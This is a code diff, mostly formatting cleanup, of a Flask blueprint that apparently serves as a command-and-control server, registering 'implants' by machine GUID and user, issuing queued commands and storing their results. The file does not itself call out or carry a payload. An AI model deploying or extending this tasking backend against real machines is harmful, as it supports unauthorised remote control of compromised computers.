@@ -1,7 +1,6 @@
 import functools
 import json
 from datetime import datetime
-from msilib.schema import Error
 
 
 from flask import (
@@ -22,7 +21,7 @@ bp = Blueprint('implant', __name__)
 def register():
     try:
         if request.method == 'POST':
-            
+
             imp_id = request.json['computer_guid']
             now = datetime.now()
             current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
@@ -42,9 +41,9 @@ def register():
 
             if error is None:
                 try:
-                    implant = Implant.query.filter_by(computer_guid=computer_guid).first()
-                    
-                    
+                    implant = Implant.query.filter_by(
+                        computer_guid=computer_guid).first()
+
                     if implant:
                         implant.computer_name = cmp_name
                         implant.computer_user = user_name
@@ -52,8 +51,7 @@ def register():
 
                         db.session.commit()
                         print("Implant updated")
-                        return jsonify({"status":"good job"})
-
+                        return jsonify({"status": "good job"})
 
                     else:
                         implant = Implant(
@@ -69,22 +67,22 @@ def register():
                         db.session.add(implant)
                         db.session.commit()
                         print("Implant added")
-                        return jsonify({"status":"good job"})
+                        return jsonify({"status": "good job"})
                 except Exception as e:
-                    print("Register error" , e)
+                    print("Register error", e)
 
-                    return jsonify({"status":"bad job"})
+                    return jsonify({"status": "bad job"})
 
             else:
-                return jsonify({"status":"bad job"})
+                return jsonify({"status": "bad job"})
 
                 print("Alert: somone is trying to play with us")
 
             flash(error)
     except Exception as e:
-        print("Register error" , e)
+        print("Register error", e)
 
-        return jsonify({"status":"bad job"})
+        return jsonify({"status": "bad job"})
 
         pass
 
@@ -100,7 +98,7 @@ def get_next_command():
                     computer_guid=impl_id, status="not_taken_by_implant").first()
                 print(next_command)
                 if next_command:
-                    
+
                     command = next_command.command_text
                     now = datetime.now()
                     current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
@@ -109,14 +107,13 @@ def get_next_command():
                     command_type = next_command.command_type
                     next_command.status = "taken_by_implant"
                     db.session.commit()
-                    return jsonify({"command_id": cmd_id, "command_text": command,"command_type":command_type})
+                    return jsonify({"command_id": cmd_id, "command_text": command, "command_type": command_type})
                 else:
-                    return jsonify({"command_id": -1, "command_text": "No command","command_type":"gaga"})
+                    return jsonify({"command_id": -1, "command_text": "No command", "command_type": "gaga"})
         except Exception as e:
             print(e)
 
-            return jsonify({"command_id": -1, "command_text": "No command","command_type":"gaga"})
-
+            return jsonify({"command_id": -1, "command_text": "No command", "command_type": "gaga"})
 
 
 @bp.route('/sendCommandResult', methods=['POST'])
@@ -129,7 +126,7 @@ def store_command_results():
 
             if impl_id:
                 commands = Command.query.filter_by(computer_guid=impl_id, status="taken_by_implant",
-                                                command_id=cmd_id).first()
+                                                   command_id=cmd_id).first()
                 if commands:
                     commands.command_result = result
                     commands.status = "completed"
@@ -178,7 +175,7 @@ def alert():
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                 alert = Alert(computer_guid=imp_id,
                               time_reported=current_date_time, alert=alert)
-                
+
                 db.session.commit()
                 return jsonify({"status": "Alert Registered"})
             except Exception as e:
